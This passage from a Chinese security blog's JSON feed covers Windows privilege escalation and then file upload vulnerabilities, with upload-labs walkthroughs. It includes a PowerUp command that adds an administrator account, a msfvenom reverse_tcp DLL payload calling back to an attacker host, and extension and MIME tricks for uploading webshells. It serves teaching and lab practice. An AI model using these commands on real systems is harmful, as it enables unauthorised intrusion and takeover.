data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111173012800.png\" alt=\"image-20231111173012800\"></p>\n<p>StartName    : LocalSystem</p>\n<p>AbuseFunction  : Install-ServiceBinary -ServiceName ‘MongoDB’</p>\n<p>利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当可直接添加管理员用户</p>\n<p>添加管理员</p>\n<p>powershell.exe -exec bypass -command “&amp;{Import-Module .\\PowerUp.ps1;Install-ServiceBinary -ServiceName ‘MongoDB’ -UserName yunyi4 -Password admin}”</p>\n<p>服务被重启或者计算机重启后就可以添加成功了</p>\n<h4 id=\"不带引号的服务路径\"><a class=\"markdownIt-Anchor\" href=\"#不带引号的服务路径\">#</a> <span class=\"label\">不带引号的服务路径</span></h4>\n<p>当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>\n<p>使用命令查看服务器存在空格，路径可写 即存在漏洞</p>\n<p>wmic service get name,displayname,pathname,startmode |findstr /i “Auto” |findstr /i /v “C:\\Windows\\” |findstr /i /v “”&quot;</p>\n<p>例如</p>\n<p>C:\\Program Files<br>\n(x86)\\2345Soft\\2345Pic\\protect\\Pic_2345Svc.exe    Auto</p>\n<p>这种存在空格</p>\n<p>msf 生成一个 program.exe 放在 c 应用重启即可上线</p>\n<h3 id=\"dll劫持提权\"><a class=\"markdownIt-Anchor\" href=\"#dll劫持提权\">#</a> <span class=\"label\">DLL 劫持提权</span></h3>\n<p>查看应用进程找数字签名或者未知文件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191157012.png\" alt=\"image-20231111191157012\"></p>\n<p>生成一个名字一样的 dll 并且替换</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.27.11 lport=6789 -f dll &gt; /root/2345MgrDLL.dll</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191517160.png\" alt=\"image-20231111191517160\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111191909318.png\" alt=\"image-20231111191909318\"></p>\n<p>msf 上线</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231111192614857.png\" alt=\"image-20231111192614857\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/09/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "url": "http://gyzero.shop/2023/11/09/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
            "title": "文件上传漏洞",
            "date_published": "2023-11-09T02:54:44.000Z",
            "content_html": "<p>文件上传漏洞是一种安全问题，它发生于程序开发者未对用户上传的文件进行充分的验证和过滤，从而让用户有可能上传能做到超越其原本权限的执行脚本文件到服务器。常见的情形包括头像上传、图片上传，以及在 Office 自动化软件中的文件上传，或者媒体文件的上传等场景。如果在处理用户上传的文件时，程序的过滤措施不当或者不严格，可能被恶意用户利用，他们可以上传含有恶意脚本的文件到服务器。一旦这些文件被服务器执行，这些恶意用户就可能获得服务器的访问权限，甚至可能对服务器造成更严重的损害。</p>\n<h3 id=\"危害\"><a class=\"markdownIt-Anchor\" href=\"#危害\">#</a> <span class=\"label warning\">危害</span></h3>\n<ol>\n<li>未授权访问：通过这个漏洞，攻击者可以上传恶意脚本或程序到服务器，并使其执行，从而控制或访问不该访问的信息或资源，实现越权。</li>\n<li>代码执行：如果服务器执行了恶意用户上传的脚本，那么可以执行任何攻击者编写的命令，包括删除文件、窃取数据、安装恶意软件等。</li>\n<li>数据泄露：攻击者可以通过上传并执行恶意脚本来窃取存储在服务器或网络中的敏感数据。</li>\n<li>拒绝服务攻击：攻击者可以上传一些占用大量计算能力的文件，从而使服务器过载，影响正常的服务提供。</li>\n<li>服务器篡改：攻击者上传的文件可能会修改服务器的设置，可能会改变访问控制、篡改网站内容，甚至插入恶意广告等。</li>\n<li>创建攻击的跳板：被利用的服务器可以作为对其他系统和网络发起进一步攻击的跳板，让攻击者能够进一步深入到网络内部。</li>\n</ol>\n<p>因此，对于任何允许用户上传文件的系统或网站来说，文件上传应严格过滤和控制，以防止这类攻击和漏洞产生。</p>\n<h3 id=\"类型\"><a class=\"markdownIt-Anchor\" href=\"#类型\">#</a> <span class=\"label warning\">类型</span></h3>\n<h4 id=\"1-直接文件上传\"><a class=\"markdownIt-Anchor\" href=\"#1-直接文件上传\">#</a> 1. 直接文件上传</h4>\n<p>攻击者可以无约束地上传文件，包括可执行的脚本文件。这将可能导致远程代码执行（RCE）漏洞，让攻击者控制服务器。</p>\n<h4 id=\"2-有条件的上传漏洞\"><a class=\"markdownIt-Anchor\" href=\"#2-有条件的上传漏洞\">#</a> 2. 有条件的上传漏洞</h4>\n<ul>\n<li>前端认证或文件检测可以被绕过： 例如，如果开发者仅通过前端 JS 代码检查文件类型，攻击者可以修改 POST 请求绕过此类验证。对于服务器端的文件类型验证，如果仅根据文件扩展名或内容头信息（MIME 类型）来检验，攻击者可以上传一个假设的图像文件，其实是一个可执行的 PHP 脚本。</li>\n<li>权限验证不足： 如果任何人，包括匿名者，都可以上传文件，那么攻击者可以轻易地上传一个恶意文件。</li>\n<li>上传逻辑有问题： 某些情况下，开发者可能没有全面地考虑到攻击者可以利用的点，例如，允许用户控制上传文件的路径和文件名；考虑不足的黑名单检验等。</li>\n<li>利用中间件或系统特性上传可解析的脚本文件： 例如 Apache 服务器可以解析.htaccess 文件，如果此文件被恶意改写，就可能导致严重的安全漏洞。</li>\n</ul>\n<h3 id=\"防御\"><a class=\"markdownIt-Anchor\" href=\"#防御\">#</a> <span class=\"label warning\">防御</span></h3>\n<p>防御文件上传漏洞，主要是对上传的文件进行严格监管。这包括：</p>\n<ol>\n<li>始终在服务器端进行文件类型、大小、内容等验证。</li>\n<li>对文件名做合适的处理，如自动生成随机的文件名，并限制有效文件拓展名。</li>\n<li>应用最小权限原则，仅授权必要的权限给特定的用户角色。</li>\n<li>把上传的文件存储在无法直接访问或无法执行脚本的位置，或者存储在数据库中。</li>\n<li>使用如 Web Application Firewall (WAF) 等工具，自动防御已知的上传攻击。</li>\n<li>您还可以进行日常的安全审计和定时的代码审查，定期更新并修复已知的安全漏洞。</li>\n</ol>\n<p>可执行脚本常见的后缀名</p>\n<p>asp asa cdx</p>\n<p>cer php aspx ashx jsp php3 php.a shtml phtml 有些网站会对 asp 或者 php 进行过滤转成空可用这些后缀名。 aspasp asaspp phpphp</p>\n<p>任意文件上传代码分析 直接获取文件名 把上传的临时文件移动到 hackable/uploads 目录</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697531656654-2e5dd0ea-53ff-409a-a714-8909b169b70c.png\" alt=\"image.png\"></p>\n<p>码并没有对用户上传的文件做过滤导致任意文件都可以上传</p>\n<h3 id=\"靶场upload-labs\"><a class=\"markdownIt-Anchor\" href=\"#靶场upload-labs\">#</a> <span class=\"label warning\">靶场 upload-labs</span></h3>\n<h4 id=\"第一关-js前端验证绕过\"><a class=\"markdownIt-Anchor\" href=\"#第一关-js前端验证绕过\">#</a> <span class=\"label warning\">第一关  js 前端验证绕过</span></h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">var</span> file <span class=\"token operator\">=</span> document<span class=\"token operator\">.</span><span class=\"token function\">getElementsByName</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file <span class=\"token operator\">==</span> <span class=\"token keyword type-declaration\">null</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">file</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"请选择要上传的文件!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 定义允许上传的文件类型</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">var</span> allow_ext <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\".jpg|.png|.gif\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 提取上传文件的类型</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">var</span> ext_name <span class=\"token operator\">=</span> file<span class=\"token operator\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>file<span class=\"token operator\">.</span><span class=\"token function\">lastIndexOf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 判断上传文件类型是否允许上传</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>allow_ext<span class=\"token operator\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>ext_name <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">var</span> errMsg <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"该文件不允许上传，请上传\"</span> <span class=\"token operator\">+</span> allow_ext <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"类型的文件,当前文件类型为：\"</span> <span class=\"token operator\">+</span> ext_name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>errMsg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>上述代码只允许上传 <span class=\"token operator\">.</span>jpg <span class=\"token operator\">.</span>png <span class=\"token operator\">.</span>gif后缀的文件，检测用户上传的文件不合法则不允许上传</pre></td></tr></table></figure><p>绕过方法</p>\n<p>burp 抓包后缀名</p>\n<p>先上传 png 后缀的恶意文件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697532501709-32a9ef21-430b-4ed0-ace5-1341ceb47be4.png\" alt=\"img\"></p>\n<p>然后绕过了前端检测后</p>\n<p>抓包在 burp 中把后缀改为 php</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697532596368-849ea0ed-ebce-4f6b-9504-fe6f40c54726.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697532768066-b306fe16-f39b-495f-8958-8e1b9cbea996.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697532851110-5ae27386-64e0-4af9-89a6-94c443ceca60.png\" alt=\"img\"></p>\n<p>因为抓到包之前前端已经检测通过，而后端接收时又没有进行检测所以上传成功，蚁剑连接</p>\n<h4 id=\"第二关-mime-检查绕过\"><a class=\"markdownIt-Anchor\" href=\"#第二关-mime-检查绕过\">#</a> <span class=\"label warning\">第二关  MIME 检查绕过</span></h4>\n<p>mime 验证文件类型</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'image/jpeg'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'image/png'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'image/gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span>            </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'文件类型不正确，请重新上传！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'文件夹不存在,请手工创建！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>抓包后修改红框里的内容，Content-Type 就是文件类型</p>\n<p>更改为下面其中一种图片格式就行</p>\n<p>image/jpeg、image/png、image/gif</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697533387760-5f84b7c9-c612-4cf6-b05f-86ad7944c4cd.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697533538703-deee2e89-50c7-40e6-9ba2-a75a98db414d.png\" alt=\"img\"></p>\n<p>蚂蚁剑连接成功</p>\n<h4 id=\"第三关\"><a class=\"markdownIt-Anchor\" href=\"#第三关\">#</a> <span class=\"label warning\">第三关</span></h4>\n<p>黑名单绕过</p>\n<p>在 iis 里 asp 禁止上传了，可以上传 asa cer cdx 这些后缀，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS14NHFzN2x1M2JxeDBkb3hlbXR2ZnhqLm5ldA==\">如在网站里允许.net</span> 执行 可以上传 ashx 代 替 aspx。如果网站可以执行这些脚本，通过上传后门即可获取 webshell。 在不同的中间件中有特殊的情况，如果在 apache 可以开启 application/x-httpd-php 在 AddType application/x-httpd-php .php .phtml .php3 后缀名为 phtml 、php3 均被解析成 php 有的 apache 版本默认就会开启。 上传目标中间件可支持的环境的语言脚本即可，如.phtml、php3。</p>\n<p>注意 php nts 版本不生效 AddType application/x-httpd-php .php .phtml .php3</p>\n<p>上传 php5 连接成功</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697553492090-3784be78-35e2-41e6-8b4c-0455defbc3a5.png\" alt=\"img\"></p>\n<h4 id=\"第四关-htaccess重写解析绕过上传\"><a class=\"markdownIt-Anchor\" href=\"#第四关-htaccess重写解析绕过上传\">#</a> <span class=\"label warning\">第四关 htaccess 重写解析绕过上传</span></h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$deny_ext</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".htm\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".phtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pht\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".Html\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".Htm\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsw\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSw\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jHtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asax\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ascx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ashx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asmx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".cer\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSpx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSax\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aScx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aShx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSmx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".cEr\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".sWf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".swf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ini\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">deldot</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 删除文件名末尾的点</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrchr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 转换为小写</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'::$DATA'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 去除字符串::$DATA</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token 